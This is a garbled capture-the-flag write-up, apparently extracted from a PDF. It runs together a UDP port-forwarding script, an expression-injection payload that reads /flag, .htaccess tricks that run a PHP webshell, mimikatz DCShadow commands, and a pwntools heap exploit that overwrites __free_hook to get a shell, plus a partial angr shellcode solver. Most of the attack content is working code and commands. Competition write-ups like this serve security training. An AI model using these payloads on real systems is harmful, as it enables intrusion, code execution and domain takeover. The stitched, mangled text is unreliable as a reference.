        self.connection['socket'].close()
        log("thread exit for: %s" % str(self.connection['address']))
        self.table_lock.acquire()
        self.connectionTable.pop(self.connection['address'])
        self.table_lock.release()
        log('Release udp connection for timeout:%s' % 
str(self.connection['address']))
class portmapUDP(threading.Thread):
    def __init__(self, port, newhost, newport, local_ip=''):
        threading.Thread.__init__(self)
        self.newhost = newhost
        self.newport = newport
        self.port = port
        self.local_ip = local_ip
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.sock.bind((self.local_ip,port))
        self.connetcTable = {}
        self.port_lock = threading.Lock()
        self.table_lock = threading.Lock()
        self.timeout = 300
        #ScanUDP(self.connetcTable,self.table_lock).start()
        log('udp port redirect run-
>local_ip:%s,local_port:%d,remote_ip:%s,remote_port:%d' % 
(local_ip,port,newhost,newport))
    def run(self):
        while True:
Web
clac
/ﬂag/ﬂag
Payload
'calc':'T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.ﬁle.Files").rea
dAllLines(T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.ﬁle.Paths"
).get("/ﬂag"))'
check in
            data,addr = self.sock.recvfrom(4096)
            connection = None
            newsock = None
            self.table_lock.acquire()
            connection = self.connetcTable.get(addr)
            newconn = False
            if connection is None:
                connection = {}
                connection['address'] = addr
                newsock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                newsock.settimeout(self.timeout)
                connection['socket'] = newsock
                connection['lock'] = self.port_lock
                connection['Serversocket'] = self.sock
                connection['time'] = time.time()
                newconn = True
                log('new connection:%s' % str(addr))
            self.table_lock.release()
            try:
                connection['socket'].sendto(data,
(self.newhost,self.newport))
            except Exception ,ex:
                log("sendto error:" + str(ex))
                #break
            if newconn:
                self.connetcTable[addr] = connection
                t1 = 
pipethreadUDP(connection,self.connetcTable,self.table_lock)
                t1.start()
        log('main thread exit')
        for key in self.connetcTable.keys():
            self.connetcTable[key]['socket'].close()
if __name__ == '__main__':
    myp = portmap(25565, '134.175.230.10', 25565)
    myp.start()
.htaccess
php
Hard_Pentest_1&2
webshell
FlagHinthintDe1ta
KerberoastHintDe1taExtendRights
ExtenRightsDcshadow
De1taSystemDe1taDMGenric Write
System beaconmake token
mimikatz !lsadump::dcshadow /object:De1ta /attribute:primaryGroupID /value:514
mimikatz @lsadump::dcshadow /push
De1taprimaryGroupIDsmb
dc
Pwn
stl_container
AddType application/x-httpd-p\
hp .zzz
p\
hp_value short_open_tag On
> ')
    p.sendline(str(iii))
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('input data:')
    p.send(s)
def dele(i):
    p.recvuntil('>> ')
    p.sendline(str(iii))
    p.recvuntil('>> ')
    p.sendline('2')
    if iii == 3 or iii == 4:
        return
    p.recvuntil('index?')
    p.sendline(str(i))
def show(i):
    p.recvuntil('>> ')
    p.sendline(str(iii))
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))
launch_gdb()
for i in xrange(1,5):
    iii = i
    add('aaaa')
    add('aaaa')
iii = 2
dele(0)
for i in [1,3]:
    iii = i
    dele(0)
    dele(0)
iii = 4
dele(0)
iii = 2
dele(0)
for i in [3]:
    iii = i
    add('aaa')
    add('aaa')
iii = 4
code_runner
binary
16checkshellcode
checkangr
patternangr
patterncheckhashz3
add('aaa')
iii = 2
add('aaa')
iii = 1
add('aaa')
# iii = 2
# raw_input()
# add('a' * 0x98)
add('\xa0')
show(1)
p.recvuntil('data: ')
leak = p.recv(6) + '\x00\x00'
leak = u64(leak)
log.info(hex(leak))
libc_base = leak - 4111520
free_hook = 4118760 + libc_base
sys_addr = 324672 + libc_base
iii = 3
dele(0)
dele(0)
iii = 2
add('aaa')
dele(0)
dele(0)
iii = 3
add(p64(free_hook-0x8))
iii = 2
add('/bin/sh\x00' + p64(sys_addr))
# add('/bin/sh\x00')
p.interactive()
    # asb(s[0]*s[0]-s[3]*s[3])?asb(s[1]*s[1]-s[2]*s[2])
    # asb(s[1]*s[1]-s[0]*s[0])?asb(s[2]*s[2]-s[3]*s[3])
shellcodecheckcheck1s
0xcbyteshellcodemaincheckshellcode
getshell
1s
import angr
import claripy
import re
import hashlib
from capstone import *
import sys
from pwn import *
import time
from random import *
import os
import logging
logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('angr.analyses').setLevel('ERROR')
logging.getLogger('pwnlib.asm').setLevel('ERROR')
logging.getLogger('angr.analyses.disassembly_utils').setLevel('ERROR')
context.log_level = "ERROR"
def pow(hash):
    for i in range(256):
        for j in range(256):
            for k in range(256):
                tmp = chr(i)+chr(j)+chr(k)
                if hash == hashlib.sha256(tmp).hexdigest():
                    print tmp
                    return tmp
#21190da8c2a736569d9448d950422a7a a1 < a2
#2a1fae6743ccdf0fcaf6f7af99e89f80 a2 <= a1
#8342e17221ff79ac5fdf46e63c25d99b a1 < a2
#51882b30d7af486bd0ab1ca844939644 a2 <= a1
tb = {
    "6aa134183aee6a219bd5530c5bcdedd7":{
        '21190da8c2a736569d9448d950422a7a':{
            '8342e17221ff79ac5fdf46e63c25d99b':"\\xed\\xd1\\xda\\x33",
            '51882b30d7af486bd0ab1ca844939644':"\\x87\\x6e\\x45\\x82"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':'\\xb7\\x13\\xdf\\x8d',
            '8342e17221ff79ac5fdf46e63c25d99b':'\\x2f\\x0f\\x2c\\x02'
        }
    },
    "745482f077c4bfffb29af97a1f3bd00a":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\\x57\\xcf\\x81\\xe7",
            '8342e17221ff79ac5fdf46e63c25d99b':"\\x80\\xbb\\xdf\\xb1"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':"\\x95\\x3e\\xf7\\x4e",
            '8342e17221ff79ac5fdf46e63c25d99b':"\\x1a\\xc3\\x00\\x92"
        }
    },
    "610a69b424ab08ba6b1b2a1d3af58a4a":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\\xfb\\xef\\x2b\\x2f",